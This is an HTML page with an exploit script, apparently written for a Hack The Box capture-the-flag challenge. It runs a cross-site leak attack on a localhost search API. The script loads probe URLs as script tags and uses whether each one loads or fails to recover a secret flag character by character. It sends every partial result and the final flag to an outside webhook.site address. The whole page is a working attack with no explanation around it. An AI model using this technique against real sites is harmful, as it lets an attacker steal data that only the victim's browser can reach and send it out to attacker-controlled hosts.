<!DOCTYPE html>
<html><head><title>x</title></head><body>
<script>
const W='https://webhook.site/5addbbcf-753a-4d5c-8510-04455720d971';
// 字符集 (flag 通常 base64-ish): 直接 charset 全打
const CHARS='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}!?@#$^&*()+=.,:;<>/| -';
const TARGET='http://127.0.0.1:1337/api/entries/search?q=';

function ping(msg){
  // 不阻塞: 用 Image 帶 cache-bust
  new Image().src = W+'?'+msg+'&_='+Math.random();
}

function probe(prefix){
  return new Promise(resolve=>{
    const s=document.createElement('script');
    s.src = TARGET + encodeURIComponent(prefix);
    let done=false;
    s.onload=()=>{ if(done) return; done=true; resolve(true); try{s.remove()}catch(e){} };
    s.onerror=()=>{ if(done) return; done=true; resolve(false); try{s.remove()}catch(e){} };
    document.head.appendChild(s);
    setTimeout(()=>{ if(!done){ done=true; resolve(false); try{s.remove()}catch(e){}}}, 5000);
  });
}

(async()=>{
  ping('start');
  // baseline
  const baseHTB = await probe('HTB{');
  ping('baseHTB='+baseHTB);
  if(!baseHTB){ 
    // 試另一種: 也許 isLocalhost 不靠 host header
    const baseAny = await probe('a');
    ping('baseAny='+baseAny);
    return; 
  }
  let known='HTB{';
  for(let i=0;i<80;i++){
    let found=null;
    // 同時試多個字 (並發)
    const probes = [];
    for(const c of CHARS){
      if(c=='_'||c=='%') continue;
      probes.push(probe(known + c).then(ok=>ok?c:null));
    }
    const results = await Promise.all(probes);
    for(const r of results){ if(r){ found=r; break; }}
    if(!found){ ping('done='+encodeURIComponent(known)); break; }
    known += found;
    ping('p='+i+'&k='+encodeURIComponent(known));
    if(found=='}'){ ping('FLAG='+encodeURIComponent(known)); break; }
  }
})();
</script>
</body></html>
